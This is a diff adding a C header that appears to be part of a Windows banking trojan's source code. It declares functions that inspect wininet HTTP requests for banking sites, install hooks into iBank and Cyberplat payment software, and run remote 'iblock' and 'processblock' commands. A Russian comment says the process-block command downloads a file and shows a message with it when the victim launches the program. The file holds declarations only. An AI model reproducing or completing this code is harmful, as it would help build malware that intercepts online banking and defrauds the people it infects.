@@ -1,0 +1,19 @@
+
+#ifndef RuBnkH
+#define RuBnkH
+//----------------------------------------------------------------------------
+#include <windows.h>
+#include <wininet.h>
+
+
+void IsBank( HINTERNET hRequest);
+bool IbankHooksMain();
+bool HookCyberplatPCMain();
+const char Iblock_Url[] = "iblock\0";
+const char Iblock_processblock[] = "processblock\0";///блокировка процесса качаем файл и при запуске выдаем мессагу с ним 
+bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args);
+bool ExecuteIblock_processblock(LPVOID Manager, PCHAR Command, PCHAR Args);
+DWORD WINAPI IBlockThread(LPVOID lpData);
+
+//----------------------------------------------------------------------------
+#endif
